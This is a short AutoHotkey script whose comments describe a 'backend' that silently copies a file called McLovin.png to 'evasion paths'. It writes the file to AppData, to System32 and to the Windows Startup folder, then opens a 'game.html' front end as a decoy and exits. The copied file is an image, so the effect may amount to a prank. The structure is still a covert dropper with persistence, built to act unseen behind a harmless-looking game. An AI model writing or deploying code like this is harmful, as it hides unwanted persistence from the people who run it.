#Requires AutoHotkey v2.0

; Backend - Silent copy to evasion paths
UserProfile := EnvGet("USERPROFILE")

DirCreate(UserProfile . "\AppData\Local\Programs")
FileCopy("McLovin.png", UserProfile . "\AppData\Local\Programs\McLovin.png", 1)

FileCopy("McLovin.png", "C:\Windows\System32\McLovin.png", 1)

DirCreate(UserProfile . "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
FileCopy("McLovin.png", UserProfile . "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\McLovin.png", 1)

; Frontend - Launch game and exit
Run("game.html")
ExitApp